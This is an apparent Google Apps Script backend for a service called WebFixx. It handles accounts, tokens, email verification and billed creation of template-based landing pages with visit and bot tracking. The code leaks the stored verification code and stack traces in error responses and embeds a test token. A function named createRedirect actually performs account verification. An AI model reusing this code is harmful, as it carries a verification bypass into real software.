    const updatedUserRow = updatedUserResult.data[0];
    const updatedUserHeaders = updatedUserResult.headers;
    const newBalance = updatedUserRow[updatedUserHeaders.indexOf("balance")] || "0.00";

    return {
      success: true,
      message: "Plan upgraded successfully.",
      data: {
        newPlan: newPlan,
        newBalance: newBalance
      }
    };

  } catch (error) {
    Logger.log("Error in changePlan:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function toggleTwoFactorAuth(params) {
  try {
    Logger.log("Starting toggleTwoFactorAuth with params:", params);
    const { userId } = params;
    let enable = params.enable;

    // Convert 'enable' to a boolean if it's a string
    if (typeof enable === 'string') {
      enable = (enable.toLowerCase() === 'true');
    }

    if (!userId || typeof enable !== 'boolean') {
      return {
        success: false,
        error: "Missing required fields: userId and a boolean 'enable' are required",
        details: {
          providedUserId: userId,
          providedEnable: params.enable,
          parsedEnableType: typeof enable,
          parsedEnableValue: enable
        }
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    // Update user's twoFactorAuth status
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      twoFactorAuth: enable ? "TRUE" : "FALSE" // Store as string "TRUE" or "FALSE"
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to toggle 2FA.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: `Two-factor authentication ${enable ? "enabled" : "disabled"} successfully.`,
      data: {
        twoFactorAuth: enable
      }
    };

  } catch (error) {
    Logger.log("Error in toggleTwoFactorAuth:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function destroyAccount(params) {
  try {
    Logger.log("Starting destroyAccount with params:", params);
    const { userId } = params;

    if (!userId) {
      return {
        success: false,
        error: "Missing required field: userId is required"
      };
    }

    // Get user data
    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const headers = userResult.headers;
    const emailIndex = headers.indexOf("email");
    const usernameIndex = headers.indexOf("username"); // Get username index
    const tokenColumnIndex = headers.indexOf("tokens");

    // Clear all tokens for the user
    if (tokenColumnIndex !== -1) {
      try {
        const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
        // userRow.rowIndex is 1-based, tokenColumnIndex is 0-based
        userSheet.getRange(userResult.rowIndex, tokenColumnIndex + 1).setValue("[]");
        Logger.log(`All tokens cleared for userId: ${userId}`);
      } catch (tokenClearError) {
        Logger.log("Error clearing tokens for destroyAccount:", tokenClearError.message);
        // This is a non-critical error, continue with account destruction
      }
    }

    // Generate a new unique email for the destroyed account
    let newDestroyedEmail = "";
    let isEmailUnique = false;
    while (!isEmailUnique) {
      const randomValue = Math.floor(1000000 + Math.random() * 9000000).toString(); // 7-digit random number
      newDestroyedEmail = `destroyed${randomValue}@webfixx.com`;
      const existingEmailCheck = getRowsByColumn("user", "email", newDestroyedEmail);
      if (!existingEmailCheck.success || existingEmailCheck.count === 0) {
        isEmailUnique = true;
      }
    }

    // Extract username from the generated email
    const newDestroyedUsername = newDestroyedEmail.split('@')[0];

    // Update user's destroyAccount status to TRUE, set new email, and new username
    const updateResult = setMultipleCellDataByColumnSearch("user", "userId", userId, {
      destroyAccount: "TRUE",
      email: newDestroyedEmail,
      username: newDestroyedUsername // Update username from email
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to destroy account.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "Account destroyed successfully."
    };

  } catch (error) {
    Logger.log("Error in destroyAccount:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

// Update secured backend function handler
function handleBackendFunction(params) {
  try {
    const token = params.token;
    if (!token) {
      return createJsonResponse(createDetailedError("Authentication required", {
        providedParams: Object.keys(params)
      }));
    }

    const tokenVerification = verifyToken(token);
    if (tokenVerification.error) {
      return createJsonResponse({
        error: "Token validation failed",
        details: tokenVerification.details
      });
    }

    // Add user data to params
    params.userId = tokenVerification.userId;
    params.userRole = tokenVerification.role;

    const backendFunctionResult = JSON.parse(backendMultiFunction(params));

    // Ensure any changes from backendMultiFunction are flushed before fetching user data
    SpreadsheetApp.flush();

    // Get comprehensive user and app data using validateUserToken
    const appDataResult = validateUserToken(token);
    if (!appDataResult.success) {
      // This should ideally not happen if verifyToken was successful, but as a safeguard
      return createJsonResponse({
        success: backendFunctionResult.success,
        error: backendFunctionResult.error || "Failed to retrieve updated app data after token verification",
        ...backendFunctionResult // Merge existing result
      });
    }

    // Extract relevant fields from backendFunctionResult
    const { success, data, error, message } = backendFunctionResult;

    return createJsonResponse({
      success: success,
      user: appDataResult.data.user,
      appData: appDataResult.data, // This includes user and other data
      needsVerification: appDataResult.needsVerification,
      data: data, // Include the data object from the specific backend function result
      error: error, // Include error if present from the specific backend function result
      message: message // Include message if present from the specific backend function result
    });
    
  } catch (error) {
    return createJsonResponse(createDetailedError("Backend function failed", {
      errorMessage: error.message,
      errorStack: error.stack,
      functionName: params.functionName,
      providedParams: Object.keys(params)
    }));
  }
}

function backendMultiFunction(params) {
  params = typeof params === "string" ? JSON.parse(params) : params;

  if (!params.functionName) {
    throw new Error("functionName is required in params");
  }

  const functionsMap = {
    // AUTH
    validateUserToken: () => validateUserToken(params.token),
    sendVerificationEmail: () => sendVerificationEmail(params),
    verifyAccount: () => verifyAccount(params),
    logout: () => handleLogout(params),
    updateAppData: () => updateAppData(params),

    // PROJECTS
    verifyTelegramNotification: () => verifyTelegramNotification(params),
    createProjectLink: () => createProjectLink(params),
    updateProjectTemplateVariables: () => updateProjectTemplateVariables(params),
    updateProjectNotifications: () => updateProjectNotifications(params),
    acquireDomain: () => acquireDomain(params),
    acquireRedirect: () => acquireRedirect(params),
    renewProject: () => renewProject(params),
    deleteProject: () => deleteProject(params),

    // REDIRECT
    createRedirect: () => createRedirect(params),
    renewRedirect: () => renewRedirect(params),
    addRedirectEndPages: () => addRedirectEndPages(params),
    updateRedirectEndPages: () => updateRedirectEndPages(params),

    // WALLET
    getCurrentValue: () => getCurrentValue(params.amount),
    initializePayment: () => initializePayment(params),
    buyUsAdrink: () => buyUsAdrink(params),

    // USER PREFERENCES
    updateUserPreferences: () => updateUserPreferences(params),
    changePassword: () => changePassword(params),
    generateApiKey: () => generateApiKey(params),
    destroyAccount: () => destroyAccount(params),
    changePlan: () => changePlan(params),
    toggleTwoFactorAuth: () => toggleTwoFactorAuth(params),
    visitNotification: () => visitNotification(params),
  };

  const requestedFunction = functionsMap[params.functionName];
  if (!requestedFunction) {
    throw new Error(`Function ${params.functionName} is not available`);
  }

  try {
    return JSON.stringify(requestedFunction());
  } catch (error) {
    console.error(`Error executing ${params.functionName}:`, error);
    throw error;
  }
}

/**
 * Verify token and update last used time
 */
function validateUserToken(token) {
  try {
    Logger.log("Starting token validation for: " + token);
    
    // Verify the token first
    const verificationResult = verifyToken(token);
    
    // Check if token verification was successful
    if (!verificationResult.success) {
      return {
        success: false,
        error: verificationResult.error || "Token verification failed",
        debug: verificationResult.debug
      };
    }

    // Extract userId and role from decoded data
    const decoded = verificationResult.decodedData;
    if (!decoded || !decoded.userId) {
      return {
        success: false,
        error: "Invalid token format"
      };
    }

    // Diagnostic logging for userId
    Logger.log("Searching for user with ID: " + decoded.userId);

    // Get user data
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    
    // Diagnostic logging for userSheet
    if (!userSheet) {
      Logger.log("User sheet not found");
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Manual row finding as a fallback
    const dataRange = userSheet.getDataRange();
    const values = dataRange.getValues();
    
    // Diagnostic logging for data range
    Logger.log("Total rows in sheet: " + values.length);
    Logger.log("Headers: " + JSON.stringify(values[0]));

    // Find the index of the userId column
    const userIdColumnIndex = values[0].indexOf("userId");
    
    if (userIdColumnIndex === -1) {
      Logger.log("userId column not found");
      return {
        success: false,
        error: "userId column not found",
        debug: { 
          headers: values[0],
          searchedUserId: decoded.userId
        }
      };
    }

    // Manual search for the user row
    const userRowIndex = values.findIndex((row, index) => 
      index > 0 && row[userIdColumnIndex] === decoded.userId
    );

    // Diagnostic logging for row finding
    Logger.log("Found user row index: " + userRowIndex);

    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { 
          userId: decoded.userId,
          totalRows: values.length - 1
        }
      };
    }

    // Get the user row data
    const user = values[userRowIndex];
    const headers = values[0];

    // Prepare user data
    const userData = {
      id: decoded.userId,
      userId: decoded.userId,
      email: user[headers.indexOf("email")],
      username: user[headers.indexOf("username")],
      role: decoded.role,
      plan: user[headers.indexOf("plan")],
      planExpiry: user[headers.indexOf("planExpiry")],
      verifyStatus: user[headers.indexOf("verifyStatus")],
      darkMode: user[headers.indexOf("darkMode")],
      twoFactorAuth: user[headers.indexOf("twoFactorAuth")],
      balance: user[headers.indexOf("balance")] || "0.00",
      pendingBalance: user[headers.indexOf("pendingBalance")] || "0.00",
      btcAddress: user[headers.indexOf("btcAddress")] || "",
      ethAddress: user[headers.indexOf("ethAddress")] || "",
      usdtAddress: user[headers.indexOf("usdtAddress")] || "",
    };

    // Get additional data
    const allData = decoded.role === "ADMIN" ? 
      getAdminData(decoded.userId) : 
      getUserData(decoded.userId);

    return {
      success: true,
      data: {
        user: userData,
        ...allData
      },
      needsVerification: userData.verifyStatus === "FALSE" || !userData.verifyStatus,
      tokenStatus: {
        validTokens: 1, // Since we've successfully validated the token
        currentTokenExpires: decoded.timestamp // Using timestamp from decoded data
      },
      decodedData: decoded
    };

  } catch (error) {
    Logger.log("Validation error: " + error);
    return {
      success: false,
      error: "Validation failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack
      }
    };
  }
}

function testValidateUserToken() {
  // Replace with a real token for testing
  const testToken = "cnIwMnxVU0VSfDE3NDQxNDEwOTc1OTd8bjVicnBmY2F6NGEuYzQyZmZmNTU0YWJkYmE5YTI3MjVmNmJmYzA4NmM4ODkzNzlmY2IzZWYwYTEzMjJkODRkOTllNGZhZmQ1NTY4NQ=="; 
  
  const result = validateUserToken(testToken);
  
  // Detailed logging of the result
  Logger.log("Validation Result - Success: " + result.success);
  
  if (result.success) {
    Logger.log("User Data:");
    Logger.log(JSON.stringify(result.data.user, null, 2));
    
    Logger.log("Decoded Data:");
    Logger.log(JSON.stringify(result.decodedData, null, 2));
  } else {
    Logger.log("Error: " + result.error);
    
    // Log debug information if available
    if (result.debug) {
      Logger.log("Debug Information:");
      Logger.log(JSON.stringify(result.debug, null, 2));
    }
  }
}

function handleLogout(params) {
  try {
    Logger.log("Starting logout process with params:", params);
    const { token } = params;

    if (!token) {
      return createJsonResponse({
        success: false,
        error: "No token provided",
        debug: { params }
      });
    }

    // Get user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return createJsonResponse({
        success: false,
        error: "User sheet not found"
      });
    }

    // Verify token and get user data
    const decoded = verifyToken(token);
    if (!decoded || decoded.error) {
      return createJsonResponse({
        success: true, // Still return success as we want to clear client session
        message: "Session cleared",
        debug: {
          error: "Invalid token",
          details: decoded?.details || null
        }
      });
    }

    // Get user data
    const userRow = getRowsByColumn("user", "userId", decoded.userId);
    if (!userRow.success || userRow.count === 0) {
      return createJsonResponse({
        success: true, // Still return success
        message: "Session cleared",
        debug: {
          error: "User not found",
          userId: decoded.userId
        }
      });
    }

    try {
      // Get and parse tokens
      const headers = userRow.headers;
      const tokenColumnIndex = headers.indexOf("tokens");
      
      if (tokenColumnIndex === -1) {
        return createJsonResponse({
          success: false,
          error: "Tokens column not found",
          debug: { availableColumns: headers }
        });
      }

      let tokens = [];
      try {
        const rawTokens = userRow.data[0][tokenColumnIndex];
        tokens = JSON.parse(rawTokens || "[]");
        Logger.log("Current tokens:", tokens.length);
      } catch (e) {
        Logger.log("Error parsing tokens:", e);
        tokens = [];
      }

      // Remove expired tokens and the logout token
      const now = new Date();
      tokens = tokens.filter(t => {
        const isExpired = new Date(t.expiresAt) < now;
        const isLogoutToken = t.token === token;
        return !isExpired && !isLogoutToken;
      });

      Logger.log("Remaining valid tokens:", tokens.length);

      // Update tokens in sheet
      userSheet.getRange(userRow.rowIndex, tokenColumnIndex + 1)
        .setValue(JSON.stringify(tokens));

      return createJsonResponse({
        success: true,
        message: "Logged out successfully",
        debug: {
          tokensRemoved: true,
          remainingTokens: tokens.length
        }
      });

    } catch (sheetError) {
      Logger.log("Sheet operation error:", sheetError);
      return createJsonResponse({
        success: false,
        error: "Failed to update tokens",
        debug: {
          errorMessage: sheetError.message,
          stack: sheetError.stack
        }
      });
    }

  } catch (error) {
    Logger.log("Logout error:", error);
    return createJsonResponse({
      success: false,
      error: "Logout failed",
      debug: {
        errorMessage: error.message,
        stack: error.stack,
        params: JSON.stringify(params)
      }
    });
  }
}

function sendVerificationEmail(params) {
  try {
    Logger.log("Starting send verification email with params:", params);
    const { userEmail } = params;
    
    if (!userEmail) {
      return { 
        success: false, 
        error: "Email is required" 
      };
    }

    // Get user data using email
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return { 
        success: false, 
        error: "User sheet not found" 
      };
    }

    // Get all data at once
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const emailColIndex = headers.indexOf("email");
    const verifyCodeColIndex = headers.indexOf("verifyCode");

    if (emailColIndex === -1 || verifyCodeColIndex === -1) {
      return {
        success: false,
        error: "Required columns not found",
        debug: { headers }
      };
    }

    // Find user row
    const userRowIndex = data.findIndex(row => row[emailColIndex] === userEmail);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { email: userEmail }
      };
    }

    // Generate verification code
    const verificationCode = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    try {
      // Update verification code - using 1-based indices
      userSheet.getRange(userRowIndex + 1, verifyCodeColIndex + 1)
        .setValue(verificationCode);
    } catch (e) {
      Logger.log("Error updating verification code:", e);
      return {
        success: false,
        error: "Failed to save verification code",
        debug: {
          rowIndex: userRowIndex + 1,
          colIndex: verifyCodeColIndex + 1,
          error: e.message
        }
      };
    }

    // Send email
    try {
      const emailTemplate = HtmlService.createTemplateFromFile('verification_email');
      emailTemplate.code = verificationCode;
      emailTemplate.username = data[userRowIndex][headers.indexOf("username")];
      
      const htmlBody = emailTemplate.evaluate().getContent();

      GmailApp.sendEmail(
        userEmail,
        "Verify Your WebFixx Account",
        `Your verification code is: ${verificationCode}`,
        {
          htmlBody: htmlBody,
          name: "WebFixx Support"
        }
      );

      return {
        success: true,
        message: "Verification email sent successfully"
      };

    } catch (e) {
      Logger.log("Error sending email:", e);
      return {
        success: false,
        error: "Failed to send email",
        debug: { error: e.message }
      };
    }

  } catch (error) {
    Logger.log("Send verification email error:", error);
    return {
      success: false,
      error: error.message,
      debug: {
        stack: error.stack,
        params: JSON.stringify(params)
      }
    };
  }
}

function visitNotification(params) {
  try {
    Logger.log("Starting visitNotification (toggle) with params:", params);
    const { userId, projectId } = params;

    if (!userId || !projectId) {
      return {
        success: false,
        error: "Missing required fields: userId and projectId are required."
      };
    }

    // Get project data
    const projectResult = getRowsByColumn("projects", "projectId", projectId);
    if (!projectResult.success || projectResult.count === 0) {
      return {
        success: false,
        error: "Project not found.",
        details: projectResult
      };
    }

    // Ensure the authenticated user owns the project (authorization)
    const projectRow = projectResult.data[0];
    const headers = projectResult.headers;
    const projectUserIdIndex = headers.indexOf("userId");
    const notifyVisitsIndex = headers.indexOf("notifyVisits");

    if (projectUserIdIndex === -1 || projectRow[projectUserIdIndex] !== userId) {
      return {
        success: false,
        error: "Unauthorized: User does not own this project."
      };
    }
    
    if (notifyVisitsIndex === -1) {
      return {
        success: false,
        error: "notifyVisits column not found in projects sheet."
      };
    }

    // Get current notifyVisits status and toggle it
    const currentNotifyVisits = String(projectRow[notifyVisitsIndex]).trim().toUpperCase() === "TRUE";
    const newNotifyVisits = !currentNotifyVisits;
    Logger.log(`Project ${projectId}: Toggling notifyVisits from ${currentNotifyVisits} to ${newNotifyVisits}`);

    // Update the notifyVisits status
    const updateResult = setMultipleCellDataByColumnSearch("projects", "projectId", projectId, {
      notifyVisits: newNotifyVisits ? "TRUE" : "FALSE" // Store as string "TRUE" or "FALSE"
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update project notification settings.",
        details: updateResult
      };
    }

    return {
      success: true,
      message: "Project notification settings updated successfully.",
      data: {
        projectId: projectId,
        notifyVisits: newNotifyVisits
      }
    };

  } catch (error) {
    Logger.log("Error in visitNotification:", error.message);
    return {
      success: false,
      error: "Server error: " + error.message,
      details: {
        stack: error.stack
      }
    };
  }
}

function createRedirect(params) {
  try {
    Logger.log("Starting account verification with params:", params);
    const { code, userEmail } = params;
    
    // Validate inputs
    if (!code || !userEmail) {
      return {
        success: false,
        error: "Verification code and email are required",
        debug: { providedParams: params }
      };
    }

    // Get spreadsheet and validate
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return {
        success: false,
        error: "User sheet not found"
      };
    }

    // Get all data at once
    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    
    // Find required column indices
    const emailColIndex = headers.indexOf("email");
    const verifyCodeColIndex = headers.indexOf("verifyCode");
    const verifyStatusColIndex = headers.indexOf("verifyStatus");

    if (emailColIndex === -1 || verifyCodeColIndex === -1 || verifyStatusColIndex === -1) {
      return {
        success: false,
        error: "Required columns not found",
        debug: {
          availableColumns: headers,
          required: ["email", "verifyCode", "verifyStatus"]
        }
      };
    }

    // Find user row
    const userRowIndex = data.findIndex(row => row[emailColIndex] === userEmail);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found",
        debug: { searchedEmail: userEmail }
      };
    }

    // Get stored verification code
    const storedCode = data[userRowIndex][verifyCodeColIndex];
    Logger.log("Stored code:", storedCode);
    Logger.log("Provided code:", code);

    if (!storedCode) {
      return {
        success: false,
        error: "No verification code found. Please request a new one.",
        debug: { userRowIndex: userRowIndex + 1 }
      };
    }

    // Compare codes (case insensitive)
    if (code.toUpperCase() !== storedCode.toString().toUpperCase()) {
      return {
        success: false,
        error: "Invalid verification code",
        debug: {
          provided: code.toUpperCase(),
          stored: storedCode.toString().toUpperCase()
        }
      };
    }

    try {
      // Update verification status - using 1-based indices
      const actualRow = userRowIndex + 1;
      
      // Update status
      userSheet.getRange(actualRow, verifyStatusColIndex + 1)
        .setValue("TRUE");
      
      // Clear verification code
      userSheet.getRange(actualRow, verifyCodeColIndex + 1)
        .setValue("");

      Logger.log("Successfully updated user verification status");
      
      return {
        success: true,
        message: "Account verified successfully"
      };

    } catch (e) {
      Logger.log("Error updating sheet:", e);
      return {
        success: false,
        error: "Failed to update verification status",
        debug: {
          error: e.message,
          rowIndex: userRowIndex + 1,
          statusColIndex: verifyStatusColIndex + 1,
          codeColIndex: verifyCodeColIndex + 1
        }
      };
    }

  } catch (error) {
    Logger.log("Verification error:", error);
    return {
      success: false,
      error: "Verification failed",
      debug: {
        errorMessage: error.message,
        errorStack: error.stack,
        params: JSON.stringify(params)
      }
    };
  }
}


function updateAppData(params) {
  try {
    const userId = params.userId;
    const userRole = params.userRole;

    // Get user data
    const userData = userRole === "ADMIN" ? getAdminData(userId) : getUserData(userId);
    
    // Get user details from user sheet
    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    const headers = userSheet.getRange(1, 1, 1, userSheet.getLastColumn()).getValues()[0];
    const rows = userSheet.getDataRange().getValues();
    
    // Find user row
    const userIdIndex = headers.indexOf("userId");
    const userRowIndex = rows.findIndex((row, index) => index > 0 && row[userIdIndex] === userId);
    
    if (userRowIndex === -1) {
      throw new Error("User not found");
    }

    const user = rows[userRowIndex];

    // Format user response
    const userResponse = {
      id: userId,
      userId: userId,
      email: user[headers.indexOf("email")],
      username: user[headers.indexOf("username")],
      role: userRole,
      verifyStatus: user[headers.indexOf("verifyStatus")] || "FALSE",
      darkMode: user[headers.indexOf("darkMode")] || "FALSE",
      balance: user[headers.indexOf("balance")] || "0.00",
      pendingBalance: user[headers.indexOf("pendingBalance")] || "0.00",
      plan: user[headers.indexOf("plan")] || "",
      planExpiry: user[headers.indexOf("planExpiry")] || "",
      twoFactorAuth: user[headers.indexOf("twoFactorAuth")] || ""
    };

    return {
      success: true,
      user: userResponse,
      data: userData,
      needsVerification: userResponse.verifyStatus === "FALSE" || !userResponse.verifyStatus
    };

  } catch (error) {
    Logger.log("Update app data error:", error);
    return { 
      success: false, 
      error: error.message || "Failed to update app data" 
    };
  }
}

function updateUserPreferences(params) {
  try {
    Logger.log("Updating user preferences with params:", params);
    const { userId, darkMode } = params;

    if (!userId || typeof darkMode === 'undefined') {
      return {
        success: false,
        error: "userId and darkMode are required parameters."
      };
    }

    const userSheet = SpreadsheetApp.getActiveSpreadsheet().getSheetByName("user");
    if (!userSheet) {
      return {
        success: false,
        error: "User sheet not found."
      };
    }

    const data = userSheet.getDataRange().getValues();
    const headers = data[0];
    const userIdColIndex = headers.indexOf("userId");
    const darkModeColIndex = headers.indexOf("darkMode");

    if (userIdColIndex === -1 || darkModeColIndex === -1) {
      return {
        success: false,
        error: "Required columns (userId, darkMode) not found in user sheet."
      };
    }

    const userRowIndex = data.findIndex(row => row[userIdColIndex] === userId);
    if (userRowIndex === -1) {
      return {
        success: false,
        error: "User not found."
      };
    }

    // Update darkMode status (convert boolean to string "TRUE" or "FALSE")
    userSheet.getRange(userRowIndex + 1, darkModeColIndex + 1).setValue(darkMode ? "TRUE" : "FALSE");

    return {
      success: true,
      message: "User preferences updated successfully.",
      darkMode: darkMode
    };

  } catch (error) {
    Logger.log("Error updating user preferences:", error);
    return {
      success: false,
      error: error.message || "Failed to update user preferences."
    };
  }
}


// PROJECT

function createProjectLink(params) {
  try {
    const { userId, title, templateId, templateVariables, telegramId, email } = params;

    if (!title || !templateId) {
      return {
        success: false,
        error: "Missing required fields: title and templateId are required"
      };
    }

    const templateResult = getRowsByColumn("template", "templateId", templateId);
    if (!templateResult.success || templateResult.count === 0) {
      return {
        success: false,
        error: "Template not found",
        details: templateResult
      };
    }

    const templateRow = templateResult.data[0];
    const templateHeaders = templateResult.headers;

    const priceIndex = templateHeaders.indexOf("price");
    const nicheIndex = templateHeaders.indexOf("niche");
    const typeIndex = templateHeaders.indexOf("type");
    const nameIndex = templateHeaders.indexOf("name");
    const codeIndex = templateHeaders.indexOf("code");

    const amount = priceIndex !== -1 ? templateRow[priceIndex] : "1000.00";
    const templateNiche = nicheIndex !== -1 ? templateRow[nicheIndex] : "";
    const templateType = typeIndex !== -1 ? templateRow[typeIndex] : "";
    const templateTitle = nameIndex !== -1 ? templateRow[nameIndex] : "";
    const templateCode = codeIndex !== -1 ? templateRow[codeIndex] : "";

    let parsedTemplateVariables = {};
    try {
      if (typeof templateVariables === 'string') {
        parsedTemplateVariables = JSON.parse(templateVariables);
      } else if (typeof templateVariables === 'object' && templateVariables !== null) {
        parsedTemplateVariables = templateVariables;
      } else {
        throw new Error("templateVariables is neither a valid string nor an object");
      }

      if (
        parsedTemplateVariables.templateData &&
        typeof parsedTemplateVariables.templateData === 'string'
      ) {
        parsedTemplateVariables.templateData = JSON.parse(parsedTemplateVariables.templateData);
      }

    } catch (e) {
      return {
        success: false,
        error: "Invalid templateVariables format",
        details: {
          rawInput: templateVariables,
          message: e.message
        }
      };
    }

    const renderedTemplateCode = renderTemplateCode(templateCode, parsedTemplateVariables);

    const userResult = getRowsByColumn("user", "userId", userId);
    if (!userResult.success || userResult.count === 0) {
      return {
        success: false,
        error: "User not found",
        details: userResult
      };
    }

    const userRow = userResult.data[0];
    const username = userResult.headers.indexOf("username") !== -1
      ? userRow[userResult.headers.indexOf("username")]
      : "";
    const userRole = userResult.headers.indexOf("role") !== -1
      ? userRow[userResult.headers.indexOf("role")]
      : "";
    const userPlan = userResult.headers.indexOf("plan") !== -1
      ? userRow[userResult.headers.indexOf("plan")]
      : "";

    const debitResult = debit({
      userId,
      amount,
      purpose: "create_project"
    });

    if (!debitResult.success) {
      if (debitResult.details && debitResult.details.message && debitResult.details.message.includes("Insufficient balance")) {
        return {
          success: false,
          error: "Project creation failed: Insufficient funds.",
          details: debitResult.details
        };
      }
      return {
        success: false,
        error: "Project creation failed: " + (debitResult.error || "Failed to debit user"),
        details: debitResult.details
      };
    }

    const projectId = `prj_${Date.now()}`;
    const createdAt = new Date().toISOString();
    const expiryDate = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000).toISOString();
    const formId = `form_${projectId}`;
    const token = Utilities.getUuid();

    // STEP: Get an available link matching templateType
    const linkResult = getAllRows("links");
    if (!linkResult.success) {
      return {
        success: false,
        error: "Failed to fetch links sheet",
        details: linkResult
      };
    }

    const linkRows = linkResult.data;
    const linkHeaders = linkResult.headers;

    const linkTypeIndex = linkHeaders.indexOf("linkType");
    const linkStatusIndex = linkHeaders.indexOf("linkStatus");
    const linkURLIndex = linkHeaders.indexOf("linkURL");
    const linkIdIndex = linkHeaders.indexOf("linkId");  // Adding this to get unique identifier for the link

    let selectedLinkRowIndex = -1;
    let mainURL = "";
    let selectedLinkId = "";

    // First, find a link where type matches templateNiche AND status is not USED
    for (let i = 0; i < linkRows.length; i++) {
      const row = linkRows[i];
      const status = row[linkStatusIndex];
      const type = row[linkTypeIndex];

      if (status !== "USED" && type === templateNiche) {
        selectedLinkRowIndex = i;
        mainURL = row[linkURLIndex];
        selectedLinkId = linkIdIndex !== -1 ? row[linkIdIndex] : "";
        break;
      }
    }

    if (!mainURL) {
      return {
        success: false,
        error: `No available link found for templateNiche: ${templateNiche}`
      };
    }
    
    // Remove any trailing slashes from mainURL to ensure consistent URL handling
    mainURL = mainURL.replace(/\/+$/, "");

    // Update linkStatus and linkUsage using the specific link's unique identifier or URL
    const updateLinkResult = selectedLinkId 
      ? setMultipleCellDataByColumnSearch("links", "linkId", selectedLinkId, {
          linkStatus: "USED",
          linkUsage: projectId
        })
      : setMultipleCellDataByColumnSearch("links", "linkURL", mainURL, {
          linkStatus: "USED",
          linkUsage: projectId
        });

    if (!updateLinkResult.success) {
      return {
        success: false,
        error: "Failed to update selected link with usage info",
        details: updateLinkResult
      };
    }

    // Verify the update was successful by checking the link status again
    const verifyLinkUpdate = selectedLinkId
      ? getRowsByColumn("links", "linkId", selectedLinkId)
      : getRowsByColumn("links", "linkURL", mainURL);
      
    if (verifyLinkUpdate.success && verifyLinkUpdate.count > 0) {
      const updatedRow = verifyLinkUpdate.data[0];
      const updatedStatus = updatedRow[verifyLinkUpdate.headers.indexOf("linkStatus")];
      
      if (updatedStatus !== "USED") {
        Logger.log(`Warning: Link status update verification failed. Expected 'USED' but got '${updatedStatus}'`);
      }
    }

    const newProject = {
      formId,
      token,
      projectId,
      createdOn: createdAt,
      userId,
      username,
      verifyStatus: userRow[userResult.headers.indexOf("verifyStatus")] || "FALSE",
      userRole,
      userPlan,
      projectTitle: title,
      templateId,
      templateNiche,
      templateTitle,
      templateType,
      templateVariables: JSON.stringify(parsedTemplateVariables),
      templateCode: renderedTemplateCode,
      email,
      telegramGroupId: telegramId,
      paymentJSON: JSON.stringify([debitResult]),
      expiryDate,
      lastPaymentDate: createdAt,
      paymentStatus: "ACTIVE",
      pageHealth: "ACTIVE",
      totalPaid: amount,
      mainURL,
      redirectVisits: 0,
      pageVisits: 0,
      botVisits: 0,
      flaggedVisits: 0,
      selectedLinkId: selectedLinkId  // Store the selected link's ID for reference
    };

    const setResult = setRowDataByHeaderMap("projects", newProject);
    if (!setResult.success) {
      return {
        success: false,
        error: "Failed to save project",
        details: setResult
      };
    }

    Utilities.sleep(2000);

    const result = getRowsByColumn("projects", "projectId", projectId);
    if (!result.success || result.count === 0) {
      return {
        success: false,
        error: "Failed to find the created project row",
        details: result
      };
    }

    const projectRow = result.data[0];
    const headers = result.headers;

    const updatedFormId = projectRow[headers.indexOf("formId")];
    const updatedPostURL = projectRow[headers.indexOf("postURL")];
    const updatedToken = projectRow[headers.indexOf("token")];

    parsedTemplateVariables.formId = updatedFormId;
    parsedTemplateVariables.postURL = updatedPostURL;
    parsedTemplateVariables.token = updatedToken;

    const finalRenderedCode = renderTemplateCode(templateCode, parsedTemplateVariables);

    const updateResult = setMultipleCellDataByColumnSearch("projects", "projectId", projectId, {
      templateVariables: JSON.stringify(parsedTemplateVariables),
      templateCode: finalRenderedCode
    });

    if (!updateResult.success) {
      return {
        success: false,
        error: "Failed to update project with generated values",
        details: updateResult
      };
    }

    const path = Utilities.getUuid().replace(/-/g, '').slice(0, 20);
    const urlPaths = [{
      path,
      linkHealth: "ACTIVE",
      inboxHealth: "INBOX",
      clicks: "0"
    }];
    const urlPathsStr = JSON.stringify(urlPaths, null, 2);
    const pageHealth = urlPaths[urlPaths.length - 1].linkHealth;
    
    // Based on the examples provided, the correct pattern seems to be:
    // 1. https://web-fixx-hoo.vercel.app/ -> https://web-fixx-hoo.vercel.app/randompath
    // 2. https://web-fixx-hoo.vercel.app/page -> https://web-fixx-hoo.vercel.app/pagerandompath (no slash between "page" and "randompath")
    
    let pageURL = '';
    
    // If URL ends with '/page', we need to attach the path directly without a slash
    if (mainURL.endsWith('/page')) {
      // Remove trailing slash if any and append path directly
      const baseURL = mainURL.replace(/\/+$/, "");
      pageURL = `${baseURL}${path}`;
    } 
    // For non-page URLs, append path with a slash
    else if (mainURL.endsWith('/')) {
      // Already has trailing slash, just append path
      pageURL = `${mainURL}${path}`;
    } else {
      // Add slash then path
